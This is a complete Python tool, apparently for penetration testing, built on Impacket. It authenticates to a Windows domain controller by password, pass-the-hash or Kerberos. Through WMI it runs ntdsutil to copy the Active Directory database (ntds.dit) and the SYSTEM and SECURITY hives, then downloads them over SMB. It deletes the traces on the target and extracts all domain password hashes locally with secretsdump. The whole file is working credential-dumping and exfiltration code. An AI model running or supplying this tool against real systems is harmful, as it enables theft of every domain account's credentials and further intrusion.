#!/usr/bin/env python3
#
# Author: @icyguider (Matthew David)
#
#   Dependencies: Impacket
#

import argparse
import subprocess
import base64, gzip, time, os, stat, sys
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.ndr import NULL
from six import PY2

CODEC = sys.stdout.encoding

class DumpNTDSCreds:
    def __init__(self, target_host='', username='', password='', domain='', nthash='', doKerberos=False, kdcHost=None, remotePath=None):
        self.__target_host = target_host
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = nthash
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__remoteShare = f'{remotePath.split(":")[0]}$'
        self.__remotePath = remotePath.split(":")[1]
        self.__outputBuffer = ''
        self.__smbclient = None
        self.__execOutFile = 'UDD3185.tmp'
        self.__dumpFolder = 'dump'

    def login(self):
        self.__smbclient = SMBConnection(self.__target_host, self.__target_host)

        if self.__doKerberos == False:
            self.__smbclient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        else:
            self.__smbclient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost)

    def download(self):
        self.login()

        files = ["Active Directory\\ntds.dit", "registry\\SYSTEM", "registry\\SECURITY"]

        for file in files:
        	fname = file.split("\\")[1]
        	print(f"[SMB] Downloading {fname}...")
	        fh = open(fname,'wb')
	        try:
	            self.__smbclient.getFile(self.__remoteShare, f"{self.__remotePath}\\{self.__dumpFolder}\\{file}", fh.write)
	        except:
	            print("[!] Dump file failed to transfer! Ntdsutil may have failed...")
	            sys.exit(1)
	        fh.close()

    def get_output(self):
        def output_callback(data):
            try:
            	self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                print('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute wmiexec.py '
                              'again with -codec and the corresponding codec')
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        self.login()

        while True:
            try:
                self.__smbclient.getFile(self.__remoteShare, f"{self.__remotePath}\\{self.__execOutFile}", output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__smbclient.reconnect()
                    return self.get_output()
        self.__smbclient.deleteFile(self.__remoteShare, f"{self.__remotePath}\\{self.__execOutFile}")

    def execute(self, data):
        dcom = DCOMConnection(self.__target_host, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              None, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)

        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32Process, _ = iWbemServices.GetObject('Win32_Process')

            pwd = f"{self.__remoteShare[:-1]}:{self.__remotePath}\\"
            shell = "cmd.exe /Q /c "
            command = shell + data
            command += ' 1> ' + '\\\\127.0.0.1\\' + self.__remoteShare + f'{self.__remotePath}\\{self.__execOutFile} 2>&1'

            if PY2:
                win32Process.Create(command.decode(sys.stdin.encoding), pwd, None)
            else:
                win32Process.Create(command, pwd, None)
            self.get_output()

        except (Exception, KeyboardInterrupt) as e:
            dcom.disconnect()
            print(f"[!] An error/interrupt occured: {e}")
            sys.stdout.flush()
            sys.exit(1)

        dcom.disconnect()
        return self.__outputBuffer

    def parse(self, outfile, nooutput):
    	# This can probably be intergrated into the script... but for now I'm lazy so subprocess call it is.
        result = subprocess.run(f"secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit LOCAL -outputfile {outfile}", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, shell=True).stdout
        if nooutput == False:
            print(result[:-1])
        print(f"[!] Hashes successfully dumped to {outfile}.ntds")

    def run(self, outfile, nooutput):
        print("[WMI] Executing ntdsutil...")
        res = self.execute(f"powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full {self.__remoteShare[:-1]}:{self.__remotePath}\\{self.__dumpFolder}' q q\"")
        self.download()
        print("[WMI] Cleaning up files on target...")
        self.execute(f"rmdir /s /q {self.__remoteShare[:-1]}:{self.__remotePath}\\{self.__dumpFolder}")
        print("[+] Parsing dump file for hashes...")
        self.parse(outfile, nooutput)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Dump NTDS.dit file, exfiltrate, and parse locally.")
    parser.add_argument("target", help="[[domain/]username[:password]@]<hostname or address>", type=str)
    parser.add_argument("-nooutput", action="store_true", help="Do not print dumped hashes to console")
    parser.add_argument('-o', '-outfile', dest="outfile", help="Name to save output files with (Default: DomainDump)", metavar="filename", default="DomainDump")
    group = parser.add_argument_group('authentication')
    group.add_argument('-H', '-hash', dest='hash', help='NTHash for login via PtH', metavar='hash', default='')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication with credentials from the KRB5CCNAME ccache file')
    group.add_argument('-dc-ip', dest='dc_ip', help='IP Address of the domain controller (useful for Kerberos auth)', metavar='IPAddress')
    parser.add_argument('-rp', '-remote-path', dest='remotePath', help='The remote path to write files to (Default: C:\\Windows\\Temp)', metavar='remotePath', default="C:\\Windows\\Temp\\")
    if len(sys.argv) == 1:
        parser.print_help()
        exit()
    args = parser.parse_args()
    username = ""
    password = ""
    domain = ""
    nthash = ""
    nthash = args.hash
    domain, username, password, target = parse_target(args.target)
    if args.k == True:
        domain = ""
    if password == '' and username != '' and args.hash == "" and args.k == False:
        from getpass import getpass
        password = getpass("[+] Password: ")
    if args.remotePath[-1] == "\\":
        rpath = args.remotePath[:-1]
    else:
        rpath = args.remotePath
    try:
        dumper = DumpNTDSCreds(target, username, password, domain, nthash, args.k, args.dc_ip, rpath)
        dumper.run(args.outfile, args.nooutput)
    except Exception as e:
        if "STATUS_ACCESS_DENIED" in str(e):
            print(
                f"[!] The user {domain}\\{username} is not local administrator on this system"
            )
        elif "STATUS_LOGON_FAILURE" in str(e):
            print(
                f"[!] The provided credentials for the user '{domain}\\{username}' are invalid or the user does not exist"
            )
        else:
            print(f"[!] Some failure happened: ({str(e)})")
        raise Exception
